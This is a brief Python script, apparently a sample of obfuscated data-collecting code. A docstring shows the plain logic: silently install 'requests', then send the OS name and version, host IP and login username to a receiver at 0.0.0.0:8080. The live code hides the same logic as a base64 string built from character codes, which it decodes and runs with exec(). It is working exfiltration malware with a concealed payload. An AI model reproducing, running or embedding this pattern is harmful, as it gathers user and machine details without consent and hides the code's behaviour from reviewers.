"""
import subprocess, sys, socket, platform, os
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests'])
import requests
data={'os_name': platform.system(),'os_ver': platform.release(), 'host_ip': socket.gethostbyname(socket.gethostname()), 'user': os.getlogin()}
try:requests.post('http://0.0.0.0:8080/receiver', json=data)
except Exception as e:print(e)
"""

import base64

payload = "".join(chr(i) for i in [97, 87, 49, 119, 98, 51, 74, 48, 73, 72, 78,
    49, 89, 110, 66, 121, 98, 50, 78, 108, 99, 51, 77, 115, 73, 72, 78, 53, 99,
    121, 119, 103, 99, 50, 57, 106, 97, 50, 86, 48, 76, 67, 66, 119, 98, 71, 70,
    48, 90, 109, 57, 121, 98, 83, 119, 103, 98, 51, 77, 75, 99, 51, 86, 105, 99,
    72, 74, 118, 89, 50, 86, 122, 99, 121, 53, 106, 97, 71, 86, 106, 97, 49, 57,
    106, 89, 87, 120, 115, 75, 70, 116, 122, 101, 88, 77, 117, 90, 88, 104, 108,
    89, 51, 86, 48, 89, 87, 74, 115, 90, 83, 119, 103, 74, 121, 49, 116, 74,
    121, 119, 103, 74, 51, 66, 112, 99, 67, 99, 115, 73, 67, 100, 112, 98, 110,
    78, 48, 89, 87, 120, 115, 74, 121, 119, 103, 74, 121, 48, 116, 99, 88, 86,
    112, 90, 88, 81, 110, 76, 67, 65, 110, 99, 109, 86, 120, 100, 87, 86, 122,
    100, 72, 77, 110, 88, 83, 107, 75, 97, 87, 49, 119, 98, 51, 74, 48, 73, 72,
    74, 108, 99, 88, 86, 108, 99, 51, 82, 122, 67, 109, 82, 104, 100, 71, 69,
    57, 101, 121, 100, 118, 99, 49, 57, 117, 89, 87, 49, 108, 74, 122, 111, 103,
    99, 71, 120, 104, 100, 71, 90, 118, 99, 109, 48, 117, 99, 51, 108, 122, 100,
    71, 86, 116, 75, 67, 107, 115, 74, 50, 57, 122, 88, 51, 90, 108, 99, 105,
    99, 54, 73, 72, 66, 115, 89, 88, 82, 109, 98, 51, 74, 116, 76, 110, 74, 108,
    98, 71, 86, 104, 99, 50, 85, 111, 75, 83, 119, 103, 74, 50, 104, 118, 99,
    51, 82, 102, 97, 88, 65, 110, 79, 105, 66, 122, 98, 50, 78, 114, 90, 88, 81,
    117, 90, 50, 86, 48, 97, 71, 57, 122, 100, 71, 74, 53, 98, 109, 70, 116, 90,
    83, 104, 122, 98, 50, 78, 114, 90, 88, 81, 117, 90, 50, 86, 48, 97, 71, 57,
    122, 100, 71, 53, 104, 98, 87, 85, 111, 75, 83, 107, 115, 73, 67, 100, 49,
    99, 50, 86, 121, 74, 122, 111, 103, 98, 51, 77, 117, 90, 50, 86, 48, 98, 71,
    57, 110, 97, 87, 52, 111, 75, 88, 48, 75, 100, 72, 74, 53, 79, 110, 74, 108,
    99, 88, 86, 108, 99, 51, 82, 122, 76, 110, 66, 118, 99, 51, 81, 111, 74, 50,
    104, 48, 100, 72, 65, 54, 76, 121, 56, 119, 76, 106, 65, 117, 77, 67, 52,
    119, 79, 106, 103, 119, 79, 68, 65, 118, 99, 109, 86, 106, 90, 87, 108, 50,
    90, 88, 73, 110, 76, 67, 66, 113, 99, 50, 57, 117, 80, 87, 82, 104, 100, 71,
    69, 112, 67, 109, 86, 52, 89, 50, 86, 119, 100, 67, 66, 70, 101, 71, 78,
    108, 99, 72, 82, 112, 98, 50, 52, 103, 89, 88, 77, 103, 90, 84, 112, 119,
    99, 109, 108, 117, 100, 67, 104, 108, 75, 81, 61, 61][::-1])[::-1]
exec(base64.b64decode(payload).decode('utf-8'))
